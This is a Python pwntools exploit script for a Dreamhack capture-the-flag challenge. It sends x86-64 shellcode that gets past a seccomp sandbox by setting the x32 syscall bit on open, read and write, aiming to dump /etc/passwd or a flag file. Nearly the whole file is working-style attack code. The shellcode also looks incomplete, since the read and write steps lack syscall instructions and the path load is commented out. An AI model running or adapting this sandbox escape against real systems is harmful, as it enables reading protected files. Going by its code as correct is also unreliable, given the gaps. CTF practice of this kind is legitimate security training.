#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./secbpf_dlist")
pwn.context.binary = pwn.ELF(exe.filepath)
# libc = ptr.ELF("")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("host3.dreamhack.games", 10172)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def assemble(shellcode: list[str], debug=False) -> bytes:
    sc = ""
    if debug:
        for i in range(len(shellcode)):
            entry = shellcode[i]
            print(f"{i}: {pwn.asm(entry).hex()}")

    for entry in shellcode:
        sc += f"{entry};"
    return pwn.asm(sc)


def main():
    io = connect()

    shellcode = [
        # "push rbp;",
        # "mov rbp, rsp",
        # "sub rsp, 0x100",
        # /etc/passwd
        # "mov rax, 0x7361702f6374652f",  # /etc/passwd
        # "mov [rbp - 0x20], rax",
        # "mov rax, 0x647773",
        # "mov [rbp - 0x18], rax",
        # /home/bypass_seccomp/flag
        # "mov rax, 0x79622f656d6f682f",
        # "mov [rbp - 0x20], rax",
        # "mov rax, 0x6365735f73736170",
        # "mov [rbp - 0x18], rax",
        # "mov rax, 0x616c662f706d6f63",
        # "mov [rbp - 0x10], rax",
        # "mov rax, 0x67",
        # "mov [rbp - 0x8], rax",
        # /root/workspace/flag
        # "mov rax, 0x6f772f746f6f722f",
        # "mov [rbp - 0x20], rax",
        # "mov rax, 0x2f65636170736b72",
        # "mov [rbp - 0x18], rax",
        # "mov rax, 0x67616c66",
        # "mov [rbp - 0x10], rax",
        # call openat()
        # "mov rdi, 0",
        # "lea rsi, [rbp-0x20]",
        # "mov rdx, 0",
        # "mov r10, 0",
        # "mov rax, 257",
        # "syscall",
        # sendfile
        # "mov rdi, 1",
        # "mov rsi, rax",
        # "mov rdx, 0",
        # "mov r10, 0x100",
        # "mov rax, 40",
        # "syscall",
        # call open with x32 mode
        # 'lea rdi, [rip+path]',
        "xor rsi, rsi",
        "mov rax, 2",
        "or rax, 0x40000000",
        "syscall",
        # call read with x32 mode
        "mov rdi, rax",
        "mov rsi, rsp",
        "mov rdx, 0x1000",
        "xor rax, rax",
        "or rax, 0x40000000",
        # call write with x32 mode
        "mov rdi, 1",
        "mov rsi, rsp",
        "mov rdx, 0x1000",
        "mov rax, 1",
        "or rax, 0x40000000",
        'path: .asciz "/etc/passwd"',
        # 'path: .asciz "/home/bypass_seccomp/flag"',
    ]

    shellcode_assembled = assemble(shellcode, debug=False)

    input(">> ")
    io.sendline(shellcode_assembled)
    io.interactive()
    # io.recvuntil(b"DH{")
    # flag = "DH{" + io.recvuntil(b"}").decode()
    # ptr.logger.info(f"flag: {flag}")

    return


if __name__ == "__main__":
    main()
